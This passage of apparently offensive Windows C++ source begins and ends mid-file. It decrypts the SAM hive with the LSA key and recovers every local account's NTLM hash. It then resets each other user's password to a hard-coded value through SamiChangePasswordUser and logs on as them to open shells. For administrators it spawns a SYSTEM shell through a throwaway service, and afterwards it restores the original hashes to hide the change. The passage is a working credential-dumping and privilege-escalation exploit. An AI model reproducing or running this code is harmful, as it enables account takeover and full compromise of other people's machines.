	// first arg, lsaKey | second arg, iv | thid arg, ciphertext
	int outsz = 0;
	int pekoutsz = 0;
	char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
	free(cyphertext);

	char* hashdata = (char*)malloc(hashlen);
	memmove(hashdata, &data[0x18 + enclen], hashlen);

	char* hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);
	free(hashdata);

	char hash256[SHA256_DIGEST_LENGTH];

	if (!ComputeSHA256(pek, pekoutsz, hash256))
	{
		free(hash);
		free(pek);
		return NULL;
	}

	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
	{
		//printf("Invalid AES password key.\n");
		free(hash);
		free(pek);
		return NULL;
	}
	free(hash);
	if (keysz)
		*keysz = sizeof(hash256);


	return pek;

}

void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* keysz)
{

	int enctype = samKey[0x68];
	if (enctype == 2) {
		int endofs = samKey[0x6c] + 0x68;
		int len = endofs - 0x70;

		char* data = (char*)malloc(len);
		memmove(data, &samKey[0x70], len);
		void* retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);
		free(data);
		return retval;
	}
	__debugbreak();
	return NULL;

}

void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int* outsz)
{
	int length = data[4];
	if (!length)
		return NULL;
	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	int ciphertextsz = datasz - 24;
	char* ciphertext = (char*)malloc(ciphertextsz);
	memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
	void* result = UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
	free(ciphertext);
	return result;
}

void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
{
	int enctype = data[2];

	switch (enctype)
	{
	case 2:

		return UnprotectPasswordHashAES(key, keysz, data, datasz, outsz);

		break;
	default:
		__debugbreak();
		break;
	}

	return NULL;


}

void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
{
	
	char* ciphertext2 = (char*)malloc(ciphertextsz);
	memmove(ciphertext2, ciphertext, ciphertextsz);
	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	struct deskeyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[8];
	}blob;
	//deskeyBlob* blob = (deskeyBlob*)malloc(sizeof(deskeyBlob) + keysz);
	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_DES;
	blob.keySize = 8;
	memmove(blob.bytes, key, 8);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(deskeyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = ciphertextsz;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)ciphertext2, &retsz);

	if (outsz)
		*outsz = 8;

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, NULL);
	return ciphertext2;

	/*
	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);
	//printf("GetLastError : %x\n", GetLastError());

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
	//printf("GetLastError : %x\n", GetLastError());
	*/
	/*
	OSSL_PROVIDER* legacy = OSSL_PROVIDER_load(NULL, "legacy");
	if (legacy == NULL)
	{
		//printf("Failed to load Legacy provider\n");
	}
	
	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();

	int fulllen = 0;
	int retval = EVP_DecryptInit_ex(en, EVP_des_ecb(), NULL, (const unsigned char*)key, NULL);

	char* plaintext = (char*)malloc(ciphertextsz);
	int _outsz = 0;
	retval = EVP_DecryptUpdate(en, (unsigned char*)plaintext, &_outsz, (const unsigned char*)ciphertext, ciphertextsz);
	int _outlen = 0;
	retval = EVP_DecryptFinal_ex(en, (unsigned char*)plaintext + _outsz, &_outlen);

	if (outsz)
		*outsz = _outsz;

	return plaintext;
	*/
}

char* DeriveDESKey(char data[7])
{
	const int DATA_LEN = 7;

	union keyderv {
		struct {
			char arr[8];
		};
		SIZE_T derv;
	};
	keyderv ttv = { 0 };
	ZeroMemory(ttv.arr, sizeof(ttv.arr));
	memmove(ttv.arr, data, DATA_LEN);
	SIZE_T k = ttv.derv;


	char* key = (char*)malloc(8);

	for (int i = 0; i < 8; i++)
	{
		int j = 7 - i;
		int curr = (k >> (7 * j)) & 0x7F;
		int b = curr;
		b ^= b >> 4;
		b ^= b >> 2;
		b ^= b >> 1;
		int keybyte = (curr << 1) ^ (b & 1) ^ 1;
		key[i] = (char)keybyte;
	}
	return key;
}

void* UnproctectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULONG rid)
{

	union keydata {
		struct {
			char a;
			char b;
			char c;
			char d;
		};
		ULONG data;
	};

	keydata keycontent = { 0 };
	keycontent.data = rid;
	char key1[7] = { keycontent.c,keycontent.b,keycontent.a,keycontent.d, keycontent.c, keycontent.b,keycontent.a };
	char key2[7] = { keycontent.b,keycontent.a,keycontent.d,keycontent.c, keycontent.b, keycontent.a,keycontent.d };

	char* rkey1 = DeriveDESKey(key1);
	char* rkey2 = DeriveDESKey(key2);


	int plaintext1sz = 0;
	int plaintext2sz = 0;
	char* plaintext1 = (char*)UnprotectDES(rkey1, sizeof(key1), ciphertext, ciphersz, &plaintext1sz);
	free(rkey1);
	if (!plaintext1)
	{
		free(rkey2);
		return NULL;
	}
	char* plaintext2 = (char*)UnprotectDES(rkey2, sizeof(key2), &ciphertext[8], ciphersz, &plaintext2sz);
	free(rkey2);
	if (!plaintext2)
	{
		free(plaintext1);
		return NULL;
	}
	void* retval = malloc(plaintext1sz + plaintext2sz);

	memmove(retval, plaintext1, plaintext1sz);
	memmove(RtlOffsetToPointer(retval, plaintext1sz), plaintext2, plaintext2sz);
	free(plaintext1);
	free(plaintext2);
	if (outsz)
		*outsz = plaintext1sz + plaintext2sz;
	return retval;
}

void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, int* outsz, ULONG rid)
{
	int _outsz = 0;
	void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &_outsz);
	if (!dec)
		return NULL;
	int _hashoutsz = 0;
	void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
	free(dec);
	if (outsz)
		*outsz = _hashoutsz;
	return _hash;
}

unsigned char* HexToHexString(unsigned char* data, int size)
{
	unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
	ZeroMemory(retval, size * 2 + 1);
	for (int i = 0; i < size; i++)
	{
		sprintf((char*)&retval[i * 2], "%02x", data[i]);
	}

	return retval;
}

#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
#define SAM_DATABASE_USERNAME_OFFSET 0x0c
#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac

struct PwdEnc
{
	char* buff;
	size_t sz;
	wchar_t* username;
	ULONG usernamesz;
	char* LMHash;
	ULONG LMHashLenght;
	char* NTHash;
	ULONG NTHashLenght;
	ULONG rid;

};


NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT HANDLE* ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
NTSTATUS WINAPI SamCloseHandle(IN HANDLE SamHandle);
NTSTATUS WINAPI SamOpenDomain(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE* DomainHandle);
NTSTATUS WINAPI SamOpenUser(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE* UserHandle);
NTSTATUS WINAPI SamiChangePasswordUser(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE* oldLM, IN const BYTE* newLM, IN BOOL isNewNTLM, IN const BYTE* oldNTLM, IN const BYTE* newNTLM);


char* CalculateNTLMHash(char* _input)
{

	int pw_len = strlen(_input);
	char* input = new char[pw_len * 2];
	for (int i = 0; i < pw_len; i++)
	{
		input[i * 2] = _input[i];
		input[i * 2 + 1] = '\0';
	}

	
	unsigned int md_len = 0;

	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_MD4, NULL, NULL, &Hhash);

	CryptHashData(Hhash, (const BYTE*)input, pw_len * 2, NULL);

	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	unsigned char* md_value = (unsigned char*)malloc(md_len);
	inputsz = md_len;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)md_value, &inputsz, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	delete[] input;
	return (char*)md_value;

}
bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
{

	wchar_t libpath[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\samlib.dll",libpath,MAX_PATH);

	HMODULE hm = LoadLibrary(libpath);
	if (!hm)
	{
		//printf("Failed to load samlib.dll\n");
		return false;
	}
	NTSTATUS(WINAPI * _SamConnect)
		(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted) = (NTSTATUS(WINAPI*)(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted))GetProcAddress(hm, "SamConnect");
	NTSTATUS(WINAPI * _SamCloseHandle)(IN HANDLE SamHandle) = (NTSTATUS(WINAPI*)(IN HANDLE SamHandle))GetProcAddress(hm, "SamCloseHandle");
	NTSTATUS(WINAPI * _SamOpenDomain)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle)
		= (NTSTATUS(WINAPI*)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle))GetProcAddress(hm, "SamOpenDomain");
	NTSTATUS(WINAPI * _SamOpenUser)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle) = (NTSTATUS(WINAPI*)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle))GetProcAddress(hm, "SamOpenUser");
	NTSTATUS(WINAPI * _SamiChangePasswordUser)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM) = (NTSTATUS(WINAPI*)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM))GetProcAddress(hm, "SamiChangePasswordUser");


	if (!_SamConnect || !_SamCloseHandle || !_SamOpenDomain || !_SamOpenUser || !_SamiChangePasswordUser)
	{
		//printf("Failed to import required functions from samlib.dll\n");
		return false;
	}

	HANDLE hsrv = NULL;
	NTSTATUS stat = _SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
	if (stat)
	{
		//printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
		return false;
	}
	////printf("Connected to local SAM.\n");
	LSA_OBJECT_ATTRIBUTES loa = { 0 };
	LSA_HANDLE hlsa = NULL;
	stat = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
	if (stat)
	{
		//printf("LsaOpenPolicy failed, error : 0x%0.8X\n", stat);
		return false;
	}
	
	POLICY_ACCOUNT_DOMAIN_INFO* domaininfo = 0;
	stat = LsaQueryInformationPolicy(hlsa, PolicyAccountDomainInformation, (PVOID*)&domaininfo);
	if (stat)
	{
		//printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
		return false;
	}
	/*wchar_t* stringsid = 0;
	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
	{
		//printf("Failed to get string sid, error : %d\n", GetLastError());
		return false;
	}
	//printf("Machine SID : %ws\n", stringsid);*/
	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
	LSA_TRANSLATED_SID* lsatrans = 0;
	LSA_UNICODE_STRING lsaunistr = { 0 };
	RtlInitUnicodeString((PUNICODE_STRING)&lsaunistr, username);
	stat = LsaLookupNames(hlsa, 1, &lsaunistr, &lsareflist, &lsatrans);
	if (stat)
	{
		//printf("LsaLookupNames failed, error : 0x%0.8X\n", stat);
		return false;
	}
	LsaClose(hlsa);
	
	HANDLE hdomain = NULL;
	stat = _SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
	if (stat)
	{
		//printf("SamOpenDomain failed, error : 0x%0.8X\n", stat);
		return false;
	}

	HANDLE huser = NULL;
	stat = _SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
	if (stat)
	{
		//printf("SamOpenUser failed, error : 0x%0.8X\n", stat);
		return false;
	}

	//char password[] = "testp";
	//char* oldNTLM = CalculateNTLMHash((char*)"testp");
	char* oldNTLM = (char*)nthash;
	char* newNTLM = newNTLMHash ? newNTLMHash : CalculateNTLMHash(newpassword);

	char oldLm[16] = { 0 };
	char newLm[16] = { 0 };
	stat = _SamiChangePasswordUser(huser, false, (BYTE*)oldLm, (BYTE*)newLm, true, (BYTE*)oldNTLM, (BYTE*)newNTLM);

	if (stat)
	{
		//printf("SamiChangePasswordUser failed, error : 0x%0.8X\n", stat);
		return false;
	}
	_SamCloseHandle(huser);
	_SamCloseHandle(hdomain);
	_SamCloseHandle(hsrv);
	/*
	if (newpassword) {
		//printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
	}
	else {
		//printf("Info : user \"%ws\" password has been changed back to older password\n", username);
	}
	*/
	return true;
}



typedef struct _SYSTEM_PROCESS_INFORMATION2
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize; // since VISTA
	ULONG HardFaultCount; // since WIN7
	ULONG NumberOfThreadsHighWatermark; // since WIN7
	ULONGLONG CycleTime; // since WIN7
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey; // since VISTA (requires SystemExtendedProcessInformation)
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1]; // SystemProcessInformation
	// SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; // SystemExtendedProcessinformation
	// SYSTEM_EXTENDED_THREAD_INFORMATION + SYSTEM_PROCESS_INFORMATION_EXTENSION // SystemFullProcessInformation
} SYSTEM_PROCESS_INFORMATION2, * PSYSTEM_PROCESS_INFORMATION2;

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		//printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		0,
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		//printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		//printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}


// Global shell binary — set by --shell flag in wmain
const wchar_t* g_ShellBinary = L"C:\\Windows\\System32\\conhost.exe";

bool DoSpawnShellAsAllUsers(wchar_t* sampath)
{
	//SSL_library_init();
	//SSL_load_error_strings();
	char newpassword[] = "$PWNed666!!!WDFAIL";
	wchar_t newpassword_unistr[] = L"$PWNed666!!!WDFAIL";
	char* newNTLM = CalculateNTLMHash(newpassword);
	bool isadmin = false;
	char* retval = 0;
	ORHKEY hSAMhive = NULL;
	ORHKEY hSYSTEMhive = NULL;
	DWORD err = OROpenHive(sampath, &hSAMhive);
	bool systemshelllaunched = false;
	if (err)
	{
		//printf("OROpenHive failed with error : %d\n", err);
		return false;
	}

	unsigned char lsakey[16] = { 0 };

	if (!GetLSASecretKey(lsakey))
	{
		//printf("Failed to dump LSA secret keys.\n");
		return false;
	}


	ORHKEY hkey = NULL;
	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account", &hkey);

	DWORD valuesz = 0;
	err = ORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
	if (err)
	{
		//printf("ORGetValue failed with error : %d\n", err);
		return false;
	}
	char* samkey = (char*)malloc(valuesz);
	err = ORGetValue(hkey, NULL, L"F", NULL, samkey, &valuesz);
	if (err)
	{
		//printf("ORGetValue failed with error : %d\n", err);
		return false;
	}

	ORCloseKey(hkey);

	///////////////////////////////////////////////////////////
	int passwordEncryptionKeysz = 0;
	char* passwordEncryptionKey = (char*)UnprotectPasswordEncryptionKey(samkey, lsakey, &passwordEncryptionKeysz);

	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
	if (err)
	{
		//printf("OROpenKey failed with error : %d\n", err);
		return false;
	}

	
	DWORD subkeys = NULL;
	err = ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (err)
	{
		//printf("ORQueryInfoKey failed with error : %d\n", err);
		return false;
	}


	PwdEnc** pwdenclist = (PwdEnc**)malloc(sizeof(PwdEnc*) * subkeys);
	int numofentries = 0;
	for (int i = 0; i < subkeys; i++)
	{
		DWORD keynamesz = 0x100;
		wchar_t keyname[0x100] = { 0 };
		err = OREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL);
		if (err)
		{
			//printf("OREnumKey failed with error : %d\n", err);
			return false;
		}
		if (_wcsicmp(keyname, L"users") == 0)
			continue;
		ORHKEY hkey2 = NULL;
		err = OROpenKey(hkey, keyname, &hkey2);
		if (err)
		{
			//printf("OROpenKey failed with error : %d\n", err);
			return false;
		}
		DWORD valuesz = 0;
		err = ORGetValue(hkey2, NULL, L"V", NULL, NULL, &valuesz);
		if (err == ERROR_FILE_NOT_FOUND)
			continue;
		if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) {
			//printf("ORGetValue failed with error : %d\n", err);
			return false;
		}
		PwdEnc* SAMpwd = (PwdEnc*)malloc(sizeof(PwdEnc));
		ZeroMemory(SAMpwd, sizeof(PwdEnc));
		SAMpwd->sz = valuesz;
		SAMpwd->buff = (char*)malloc(valuesz);
		ZeroMemory(SAMpwd->buff, valuesz);
		err = ORGetValue(hkey2, NULL, L"V", NULL, SAMpwd->buff, &valuesz);
		if (err)
		{
			//printf("ORGetValue failed with error : %d\n", err);
			return false;
		}
		SAMpwd->rid = wcstoul(keyname, NULL, 16);

		ULONG* accnameoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_OFFSET];
		SAMpwd->username = (wchar_t*)RtlOffsetToPointer(SAMpwd->buff, *accnameoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* usernamesz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_LENGTH_OFFSET];
		SAMpwd->usernamesz = *usernamesz;

		ULONG* LMhashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_OFFSET];
		SAMpwd->LMHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *LMhashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* LMhashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_LENGTH_OFFSET];
		SAMpwd->LMHashLenght = *LMhashsz;

		ULONG* NTHashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_OFFSET];
		SAMpwd->NTHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *NTHashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* NThashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
		SAMpwd->NTHashLenght = *NThashsz;

		pwdenclist[i] = SAMpwd;
		numofentries++;
	}


	wchar_t currentusername[UNLEN + 1] = { 0 };
	DWORD usernamesz = sizeof(currentusername) / sizeof(wchar_t);
	if (!GetUserName(currentusername, &usernamesz))
	{
		//printf("Failed to get current user name, error : %d", GetLastError());
		return false;
	}


	for (int i = 0; i < numofentries; i++)
	{
		PwdEnc* samentry = pwdenclist[i];
		int realNTLMHashsz = 0;
		char* realNTLMHash = (char*)UnprotectNTHash(passwordEncryptionKey, passwordEncryptionKeysz, samentry->NTHash, samentry->NTHashLenght, &realNTLMHashsz, samentry->rid);
		char* stringntlm = 0;
		char emptyrepresentation[] = "{NULL}";
		if (realNTLMHashsz)
		{
			stringntlm = (char*)HexToHexString((unsigned char*)realNTLMHash, realNTLMHashsz);
		}
		else
		{

			stringntlm = emptyrepresentation;
		}
		wchar_t username[UNLEN + 1] = { 0 };
		if (samentry->usernamesz <= sizeof(username))
		{
			memmove(username, samentry->username, samentry->usernamesz);
		}
		//printf("******************************************\n");
		//printf("    User : %ws\n    RID : %d\n    NTLM : %s\n", username, samentry->rid, stringntlm);
		if (stringntlm && stringntlm != emptyrepresentation)
			free(stringntlm);
		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
			//printf("    Skip : NULL NTLM.\n");
			continue;
		}
		if (_wcsicmp(username, currentusername) == 0)
		{
			//printf("    Skip : Current User.\n");
			free(realNTLMHash);
			continue;
		}
		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
		{
			//printf("    Skip : WDAGUtilityAccount detected.\n");
			free(realNTLMHash);
			continue;
		}
		
			retval = realNTLMHash;

			if (ChangeUserPassword(username, realNTLMHash, NULL,newNTLM))
			{
				//printf("    NewPasswordSet : OK.\n");

				HANDLE htoken = NULL;
				PSID logonsid = 0;
				if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken, &logonsid, NULL, NULL, NULL))
				{
					//printf("LogonUserEx failed, error : %d\n", GetLastError());
				}
				if (!systemshelllaunched) {
					TOKEN_ELEVATION_TYPE tokentype;
					DWORD retsz = 0;
					if (!GetTokenInformation(htoken, TokenElevationType, &tokentype, sizeof(tokentype), &retsz))
					{
						//printf("GetTokenInformation failed with error : %d\n", GetLastError());
					}

					if (tokentype == TokenElevationTypeLimited)
					{
						TOKEN_LINKED_TOKEN linkedtoken = { 0 };


						if (!GetTokenInformation(htoken, TokenLinkedToken, &linkedtoken, sizeof(TOKEN_LINKED_TOKEN), &retsz))
						{
							//printf("GetTokenInformation failed with error : %d\n", GetLastError());
						}

						HANDLE hdup = linkedtoken.LinkedToken;

						DWORD sidsz = MAX_SID_SIZE;
						PSID administratorssid = malloc(sidsz);

						if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, administratorssid, &sidsz))
						{
							//printf("Failed to create well known sid, error : %d\n", GetLastError());
						}



						if (!CheckTokenMembership(hdup, administratorssid, (PBOOL)&isadmin))
						{
							//printf("CheckTokenMembership failed with error : %d\n", GetLastError());
						}
						free(administratorssid);

						CloseHandle(hdup);
					}

					if (isadmin)
					{




						//printf("    IsAdmin : TRUE\n");
						HANDLE htoken2 = NULL;
						if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &htoken2, &logonsid, NULL, NULL, NULL))
						{
							//printf("LogonUserEx failed, error : %d\n", GetLastError());
						}
						//SetPrivilege(htoken2, SE_DEBUG_NAME, TRUE);
						const wchar_t sid_string[] = L"S-1-16-8192";
						TOKEN_MANDATORY_LABEL integrity;
						PSID  sid = NULL;
						ConvertStringSidToSidW(sid_string, &sid);
						ZeroMemory(&integrity, sizeof(integrity));
						integrity.Label.Attributes = SE_GROUP_INTEGRITY;
						integrity.Label.Sid = sid;
						if (SetTokenInformation(htoken2, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
							//wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
						}
						LocalFree(sid);
						//CloseHandle(htoken2);

						ImpersonateLoggedOnUser(htoken2);


						SC_HANDLE hmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
						if (!hmgr)
						{
							//printf("OpenSCManager failed with error : %d", GetLastError());
						}

						GUID uid = { 0 };
						RPC_WSTR wuid = { 0 };
						wchar_t* wuid2 = 0;

						UuidCreate(&uid);
						UuidToStringW(&uid, &wuid);
						wuid2 = (wchar_t*)wuid;

						wchar_t binpath[MAX_PATH] = { 0 };
						GetModuleFileName(GetModuleHandle(NULL), binpath, MAX_PATH);
						wchar_t servicecmd[MAX_PATH] = { 0 };
						DWORD currentsesid = 0;
						ProcessIdToSessionId(GetCurrentProcessId(), &currentsesid);
						bool useShell = _wcsicmp(g_ShellBinary, L"C:\\Windows\\System32\\cmd.exe") == 0;
						wsprintf(servicecmd, useShell ? L"\"%s\" %d --shell" : L"\"%s\" %d", binpath, currentsesid);

						SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicecmd, NULL, NULL, NULL, NULL, NULL);
						if (!hsvc)
						{
							//printf("CreateService Failed with error : %d\n", GetLastError());
						}
						else {
							//printf("    SYSTEMShell : OK.\n");
						}

						StartService(hsvc, NULL, NULL);
						Sleep(100);
						DeleteService(hsvc);
						CloseServiceHandle(hsvc);
						CloseServiceHandle(hmgr);
						RevertToSelf();
						CloseHandle(htoken2);
						systemshelllaunched = true;
					}
					else {
						//printf("    IsAdmin : FALSE\n");
					}


				}

				STARTUPINFO si = { 0 };
				PROCESS_INFORMATION pi = { 0 };
				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, g_ShellBinary, NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
				{
					//printf("    Shell : Error %d\n", GetLastError());
				}
				else {
					//printf("    Shell : OK.\n");
					if (pi.hProcess)
						CloseHandle(pi.hProcess);
					if (pi.hThread)
						CloseHandle(pi.hThread);
				}

				if (!ChangeUserPassword(username, newNTLM, NULL, realNTLMHash))
				{
					//printf("    PasswordRestore : Error %d\n", GetLastError());
				}
				
				else {
					//printf("    PasswordRestore : OK.\n");
				}
				CloseHandle(htoken);
			}
			
			// __debugbreak();

			free(realNTLMHash);


	}

	// Clean up SAM parsing allocations
	for (int i = 0; i < numofentries; i++)
	{
		if (pwdenclist[i])
		{
			free(pwdenclist[i]->buff);
			free(pwdenclist[i]);
		}
	}
	free(pwdenclist);
	free(samkey);
	free(passwordEncryptionKey);

	ORCloseKey(hkey);
	ORCloseHive(hSAMhive);
	//printf("******************************************\n");
	free(newNTLM);
	return true;



}

bool IsRunningAsLocalSystem()
{

	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
		LogW("[SYSTEM] OpenProcessToken(TOKEN_QUERY) failed while checking identity: %lu",
			GetLastError());
		return false;
	}
	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
	if (!tokenuser)
	{
		CloseHandle(htoken);
